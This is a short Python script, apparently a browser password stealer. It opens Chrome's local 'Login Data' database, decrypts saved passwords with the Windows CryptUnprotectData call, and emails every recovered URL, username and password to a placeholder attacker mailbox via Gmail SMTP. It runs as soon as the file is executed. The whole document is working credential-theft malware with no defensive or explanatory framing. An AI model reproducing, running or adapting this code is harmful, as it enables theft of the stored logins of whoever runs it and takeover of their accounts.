from os import getenv
import sqlite3
import win32crypt
import smtplib

def sendSMTP(output): 
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    sender = "YOUR EMAIL"
    password = "YOUR PASSWORD"
    reciever = "CREDENTIAL RECIEVING EMAIL"
    server.login(sender, password)
    msg = "\n"
    msg += str(output)
    server.sendmail(reciever, reciever, msg)
    server.quit()
      
def main():
        whole = ""
# Connect to the Database
        conn = sqlite3.connect(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
        cursor = conn.cursor()
# Get the results
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
          # Decrypt the Password
                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
                password = password.decode("utf-8") 
                if password:
                        whole += " " + str(result[0])
                        whole += "\r\n"
                        whole += " " + str(result[1])
                        whole += "\r\n"
                        whole += " " + str(password)
                        whole += "\r\n"
                        whole += "\r\n"
                        whole += "\r\n"
        conn.close()
        sendSMTP(whole)
main()
